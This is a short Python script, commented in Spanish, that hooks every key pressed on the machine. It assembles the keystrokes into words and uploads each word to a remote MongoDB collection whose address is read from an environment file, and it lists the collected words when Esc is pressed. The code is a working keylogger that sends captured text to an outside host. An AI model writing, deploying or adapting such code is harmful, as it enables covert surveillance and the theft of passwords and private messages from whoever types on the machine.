import keyboard 
import sys
import os
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

load_dotenv()

uri = os.getenv("uri")
client = MongoClient(uri, server_api=ServerApi('1'))
db = client['Prueba']
coleccion = db['Primera']
palabra = ""


def pulsacion_tecla(pulsacion):
    global palabra
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space':
            guardar_palabra()
            resetear_palabra()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name


keyboard.hook(pulsacion_tecla)

def guardar_palabra():
    global palabra
    if palabra.strip():
        coleccion.insert_one({"palabra": palabra})
        print("Palabra guardada en la base de datos:", palabra)
    else:
        print("No hay palabra para guardar.")

def resetear_palabra():
    global palabra
    palabra = ""

try:
    keyboard.wait("esc")

    palabras = coleccion.find()

    print("\n📋 Palabras registradas en MongoDB:")
    for doc in palabras:
        print("- " + doc.get("palabra", ""))

except KeyboardInterrupt:
    print("Script detenido por el usuario.")
